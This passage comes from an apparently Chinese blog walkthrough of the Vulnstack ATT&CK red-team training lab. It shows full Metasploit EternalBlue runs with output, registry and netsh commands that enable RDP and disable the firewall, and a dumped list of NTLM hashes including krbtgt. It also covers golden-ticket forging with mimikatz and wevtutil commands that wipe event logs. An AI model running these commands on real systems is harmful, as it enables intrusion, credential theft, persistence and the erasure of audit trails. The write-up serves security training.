created.\n</code></pre>\n<p>提示该模块仅支持<code>x64</code>，但是靶机是<code>x32</code>的，换了<code>ms17_010_psexec</code> ，但是shell死活连不上</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(windows/smb/ms17_010_psexec) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Target OS: Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Filling barrel <span class=\"hljs-keyword\">with</span> fish... done\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - &#x3C;---------------- | Entering Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -        [*] Preparing dynamite...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -                Trying stick <span class=\"hljs-number\">1</span> (x64)...Miss\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -                [*] Trying stick <span class=\"hljs-number\">2</span> (x86)...Boom!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -        [+] Successfully Leaked Transaction!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> -        [+] Successfully caught Fish-<span class=\"hljs-keyword\">in</span>-a-barrel\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - &#x3C;---------------- | Leaving Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Reading <span class=\"hljs-keyword\">from</span> CONNECTION struct at: <span class=\"hljs-number\">0x8d666d60</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Built a write-what-where primitive...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Overwrite complete... SYSTEM session obtained!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Selecting native target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Uploading payload... xxjxkZjL.exe\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Created \\xxjxkZjL.exe...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Service started successfully...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Deleting \\xxjxkZjL.exe...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">4444</span>\n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\n[-] Meterpreter session <span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> valid <span class=\"hljs-keyword\">and</span> will be closed\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span> - Meterpreter session <span class=\"hljs-number\">3</span> closed.  Reason: Died\n</code></pre>\n</li>\n</ol>\n<h3>尝试ms17_010_command</h3>\n<p>因为域成员<code>141</code>是<code>32</code>位的，MSF的永恒之蓝仅支持<code>x64</code> ，所以我们换一个全版本的，仅用来执行命令的</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use auxiliary/admin/smb/ms17_010_command \nmsf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Target OS: Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span>                                          \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Filling barrel <span class=\"hljs-keyword\">with</span> fish... done                                             \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Entering Danger Zone | ---------------->                 \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [*] Preparing dynamite...                                                \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             Trying stick <span class=\"hljs-number\">1</span> (x64)...Miss                                      \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             [*] Trying stick <span class=\"hljs-number\">2</span> (x86)...Boom!                                 \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully Leaked Transaction!                                     \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully caught Fish-<span class=\"hljs-keyword\">in</span>-a-barrel                                 \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Leaving Danger Zone | ---------------->                  \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Reading <span class=\"hljs-keyword\">from</span> CONNECTION struct at: <span class=\"hljs-number\">0x8d66dd60</span>                                \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Built a write-what-where primitive...                                        \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Overwrite complete... SYSTEM session obtained!                               \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Getting the command output...                                                \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Executing cleanup...    \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Cleanup was successful                                                       \n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Command completed successfully!                                              \n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"net group \"</span>Domain Admins<span class=\"hljs-string\">\" /domain\"</span>:                              \n\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.                                 \n\nGroup name     Domain Admins                        \nComment        ???????                              \n\nMembers                                             \n\n-------------------------------------------------------------------------------                          \nAdministrator            OWA$                                                                            \nThe command completed successfully.                 \n</code></pre>\n<p>命令执行成功了，我们换一条命令，将其远程桌面服务打开</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> command <span class=\"hljs-string\">'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Target OS: Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Filling barrel <span class=\"hljs-keyword\">with</span> fish... done\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Entering Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [*] Preparing dynamite...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             Trying stick <span class=\"hljs-number\">1</span> (x64)...Miss\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -             [*] Trying stick <span class=\"hljs-number\">2</span> (x86)...Boom!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully Leaked Transaction!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    -     [+] Successfully caught Fish-<span class=\"hljs-keyword\">in</span>-a-barrel\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - &#x3C;---------------- | Leaving Danger Zone | ---------------->\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Reading <span class=\"hljs-keyword\">from</span> CONNECTION struct at: <span class=\"hljs-number\">0x8d1c0d60</span>\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Built a write-what-where primitive...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Overwrite complete... SYSTEM session obtained!\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Getting the command output...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Executing cleanup...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Cleanup was successful\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Command completed successfully!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\"</span> <span class=\"hljs-string\">\"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\"</span>:\n\nThe operation completed successfully.\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n</code></pre>\n<p>成功打开，尝试连接，使用<code>rdesktop</code> ,用户就用得到的域管理员用户，也可以自己新建（图片上的密码其实是<code>hongrisec@2019</code>的）</p>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span> -p hongrisec@<span class=\"hljs-number\">2019</span> -u administrator\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image11.png\" alt=\"image.png\"></p>\n<p>登陆成功，拿下<code>141</code> ，域控尝试能不能也拿下了,记得关防火墙</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> command <span class=\"hljs-string\">'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>\nmsf6 auxiliary(admin/smb/ms17_010_command) > <span class=\"hljs-built_in\">set</span> command <span class=\"hljs-built_in\">set</span> command netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n</code></pre>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.38</span> -p hongrisec@<span class=\"hljs-number\">2019</span> -u administrator\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image12.png\" alt=\"image.png\"></p>\n<p>也是可以拿下的，但是用户不存在AD域的文件和<code>ad</code>域管理器，但确实是管理员账户，也算是拿下域控了</p>\n<h2>权限维持（黄金票据）</h2>\n<p>黄金票据是指能够绕过认证授权（Authentication and Authorization）机制并获得所需权限的票据。</p>\n<ol>\n<li>\n<p>现在已经获得域的权限了</p>\n</li>\n<li>\n<p>我们要收集域名称，域管理员账户<code>SID</code>，<code>krbtgt</code>账户的<code>HTLM</code>的<code>HASH</code> （重要）</p>\n</li>\n<li>\n<p>获取域SID以及域名称</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image13.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image14.png\" alt=\"image.png\"></p>\n<p>域名称<code>god.org</code> ,<code>SID</code>为<code>S-1-5-21-2952760202-1353902439-2381784089</code> 后面的<code>500</code>不需要</p>\n</li>\n<li>\n<p>获取<code>KRBTGT</code> 的<code>NTLM</code>的<code>HASH</code></p>\n<p>我这里使用<code>CS</code>抓取</p>\n<pre><code class=\"hljs language-python\">beacon> hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: <span class=\"hljs-number\">82541</span> <span class=\"hljs-built_in\">bytes</span>\n[+] received password hashes:\nAdministrator:<span class=\"hljs-number\">500</span>:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::\nGuest:<span class=\"hljs-number\">501</span>:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:<span class=\"hljs-number\">502</span>:aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::\nliukaifeng01:<span class=\"hljs-number\">1000</span>:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::\nligang:<span class=\"hljs-number\">1106</span>:aad3b435b51404eeaad3b435b51404ee:1e3d22f88dfd250c9312d21686c60f41:::\nOWA$:<span class=\"hljs-number\">1001</span>:aad3b435b51404eeaad3b435b51404ee:35c29a27ff5086ba975d49493673eddb:::\nROOT-TVI862UBEH$:<span class=\"hljs-number\">1104</span>:aad3b435b51404eeaad3b435b51404ee:c1e8fa40153fef225ce4f3d627181bcf:::\nSTU1$:<span class=\"hljs-number\">1105</span>:aad3b435b51404eeaad3b435b51404ee:75c2c82fa50b7716428d85372374b139:::\nDEV1$:<span class=\"hljs-number\">1107</span>:aad3b435b51404eeaad3b435b51404ee:bed18e5b9d13bb384a3041a10d43c01b:::\n</code></pre>\n<p><code>KRBTGT</code> 的<code>NTLM</code>的<code>HASH</code> 是<code>58e91a5ac358d86513ab224312314061</code> ，收集完这些信息后金票票据就可以制作了</p>\n</li>\n<li>\n<p>首先创建一个用户<code>test</code> ，默认没有管理员权限，</p>\n</li>\n<li>\n<p>假如现在域管理员账户被改了，我们没有密码，只能登陆<code>test</code>用户</p>\n</li>\n<li>\n<p>登录test用户，测试权限</p>\n<p>通过网络访问域控文件像是<code>access is denied</code> 无权限</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image15.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>制作黄金票据,将<code>mimikatz</code>拿到客户机</p>\n<p>格式：kerberos::golden /user:XXX任意用户名 /domain:域名 /sid:域的sid值 /ticket:XXX.kirbi(生成的票据名称)</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image16.png\" alt=\"image.png\"></p>\n<p>生成成功</p>\n</li>\n<li>\n<p>使用<code>klist</code>查看生成的票据</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image17.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>再通过网络访问域控文件，成功获取</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image18.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>这样就可以重新获得域的管理权，前提是<code>krbtgt</code> 账户的密码没有被修改</p>\n</li>\n</ol>\n<h2>痕迹清理</h2>\n<pre><code class=\"hljs language-python\">shell wevtutil cl security    //清理安全日志\nshell wevtutil cl system        //清理系统日志\nshell wevtutil cl application        //清理应用程序日志\nshell wevtutil cl <span class=\"hljs-string\">\"windows powershell\"</span>    //清除power shell日志\nshell wevtutil cl Setup     //清除（cl）事件日志中的 <span class=\"hljs-string\">\"Setup\"</span> 事件。\n</code></pre>","title":"Vulnstack - ATT&CK红队评估实战靶场(一)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机","description":"ATT&CK红队评估实战靶场(一) http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ /image.png) 靶场搭建 靶机通用密码：hongrisec@2019 ip网络设置 创建一个仅主机的虚拟网卡，网段是192.168.52.0 ，nat网卡随..."},"recentPosts":[{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"}]},"__N_SSG":true}